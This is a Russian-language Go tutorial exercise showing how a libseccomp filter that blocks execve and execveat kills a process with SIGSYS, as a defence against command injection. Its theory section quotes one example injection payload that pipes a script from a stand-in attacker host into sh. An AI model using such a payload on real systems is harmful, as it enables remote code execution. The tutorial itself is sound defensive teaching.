# Seccomp (Блокировка Exec): Отражение шелл-инъекций и сигнал SIGSYS

## Условие

Напишите Go-программу, которая сначала успешно выполняет внешнюю утилиту (например, exec.Command('ls')). Затем программа конфигурирует Seccomp-фильтр, который категорически запрещает системные вызовы execve и execveat с действием SECCOMP_RET_KILL_PROCESS. Продемонстрируйте повторный вызов exec.Command('ls') и покажите, что программа мгновенно уничтожается ядром операционной системы по сигналу SIGSYS, делая выполнение произвольных shell-команд физически невозможным.

### Исходная формулировка

**Seccomp (Блокировка Exec)**: Напиши Go-программу, которая делает `os.Exec("ls")`. Убедись, что она работает. Теперь добавь Seccomp фильтр, который **запрещает** системный вызов `execve` (выполнение других программ). Попробуй сделать `os.Exec` — твоя программа будет мгновенно убита ядром ОС с сигналом `SIGSYS`. *Хакер больше не сможет запустить bash-шелл из твоего сервиса!*

## Теория

В архитектуре безопасности Linux системный вызов `execve` занимает особое место. Это единственный примитив ядра, позволяющий текущему процессу заменить свой образ в памяти на новый исполняемый файл (ELF-бинарник) с сохранением PID.

### Смертельный удар по эксплойтам:
Если в веб-приложении найдена уязвимость Command Injection (например, вызов `os/exec` с неэкранированными данными от пользователя), атакующий отправляет полезную нагрузку вида:
```bash
; curl http://attacker.com/malware | sh;
```
Если в сервисе применен Seccomp-фильтр `SECCOMP_RET_KILL_PROCESS` для `execve`:
1. Парсер аргументов Go начинает готовить структуры и переходит к низкоуровневому вызову `execve`.
2. Ядро Linux в функции `seccomp_run_filters()` немедленно определяет совпадение с запрещенным правилом.
3. Фильтр возвращает статус `SECCOMP_RET_KILL_PROCESS`.
4. Ядро **мгновенно и безусловно отправляет сигнал SIGSYS (Signal 31)** всей группе потоков процесса (`task->signal->flags |= SIGNAL_GROUP_EXIT`).
5. Процесс погибает в течение наносекунд, ядро генерирует core dump и запись в audit-лог. Атака сорвана, шелл не запущен, данные не скомпрометированы!

## Решение по шагам

Реализуйте выполнение легитимной команды `exec.Command('echo', 'Hello from initial exec')`.
Подключите `libseccomp` (или чистый BPF) и создайте правило с действием `libseccomp.ActKillProcess` для сисколлов `execve` и `execveat`.
Загрузите фильтр в ядро Linux через `filter.Load()`.
Выведите информационное сообщение о том, что выполнение шелл-команд отныне заблокировано.
Вызовите `exec.Command('ls')` и убедитесь, что процесс падает с аварийным завершением `SIGSYS`.

## Код решения

**`main.go`**

```go
package main

import (
	"fmt"
	"log"
	"os/exec"

	libseccomp "github.com/seccomp/libseccomp-golang"
)

// BlockAllExecs активирует фатальный запрет на вызовы execve и execveat.
func BlockAllExecs() error {
	// Фильтр по умолчанию разрешает все системные вызовы
	filter, err := libseccomp.NewFilter(libseccomp.ActAllow)
	if err != nil {
		return fmt.Errorf("NewFilter error: %w", err)
	}

	// Список запрещаемых сисколлов
	execSyscalls := []string{"execve", "execveat"}

	for _, scName := range execSyscalls {
		sysID, err := libseccomp.GetSyscallFromName(scName)
		if err != nil {
			continue
		}
		// При попытке вызова — немедленное уничтожение процесса
		if err := filter.AddRule(sysID, libseccomp.ActKillProcess); err != nil {
			return fmt.Errorf("failed to block %s: %w", scName, err)
		}
	}

	if err := filter.Load(); err != nil {
		return fmt.Errorf("filter.Load failed: %w", err)
	}
	return nil
}

func main() {
	fmt.Println("=== ЭТАП 1: Легитимный запуск внешней программы ДО Seccomp ===")
	out, err := exec.Command("echo", "Системный вызов execve РАЗРЕШЕН").CombinedOutput()
	if err != nil {
		log.Fatalf("Ошибка выполнения: %v", err)
	}
	fmt.Printf("Результат: %s\n", string(out))

	fmt.Println("=== ЭТАП 2: Активация смертоносного фильтра Seccomp (ActKillProcess) ===")
	if err := BlockAllExecs(); err != nil {
		log.Fatalf("Не удалось установить Seccomp фильтр: %v", err)
	}
	fmt.Println("🛡️ Фильтр активен: любой вызов execve приведет к немедленной гибели процесса от SIGSYS.")

	fmt.Println("=== ЭТАП 3: Попытка выполнить exec.Command('ls') ===")
	fmt.Println("Прямо сейчас ядро Linux перехватит вызов и уничтожит процесс...")

	// Попытка запустить ls приведет к отправке ядром сигнала SIGSYS
	cmd := exec.Command("ls")
	_ = cmd.Run()

	// До этой точки код НИКОГДА не дойдет!
	fmt.Println("❌ ОШИБКА: Если вы видите этот текст, фильтр не сработал!")
}
```

**`test.sh`**

```bash

# Демонстрация работы Seccomp блокировки execve
```

## Под капотом

Сигнал `SIGSYS` (номер 31 на архитектуре x86) по умолчанию генерирует core dump и немедленно завершает процесс. Даже если в Go-приложении перехватить сигнал через `os/signal.Notify(c, syscall.SIGSYS)`, при действии `SECCOMP_RET_KILL_PROCESS` ядро не передает управление в обработчик сигналов процесса, а безусловно уничтожает весь поток выполнения `do_exit(SIGSYS)` на уровне кольца 0.

## Подводные камни

Если в вашей архитектуре микросервис должен запускать внешние плагины или вспомогательные скрипты (например, ImageMagick или ffmpeg), блокировка `execve` полностью сломает эту функциональность. В таких случаях архитектурно правильным решением является вынос выполнения внешних бинарников в отдельный изолированный микросервис-воркер (Worker Service) через RPC/очередь сообщений, а основной API-шлюз защитить жестким Seccomp-фильтром.

## На собеседовании

Вопрос с собеседования в Т-Банк: 'Можно ли обойти Seccomp-фильтр, блокирующий execve, если злоумышленник получил возможность записи в произвольную область памяти процесса (Write-What-Where)?' Ответ: 'Нет, стандартными методами ядра обойти Seccomp невозможно, потому что правила хранятся в защищенной памяти ядра (ring 0) и проверяются ядром при каждом системном вызове. Единственный путь обхода — если у процесса открыт сетевой сокет, атакующий может вручную написать парсер ELF в userspace и выполнить его в том же адресном пространстве без системного вызова execve (так называемый userland exec / in-memory execution). Для защиты от этого применяют комплексные меры: запрет mprotect с флагом PROT_EXEC и запуск в read-only контейнерах.'
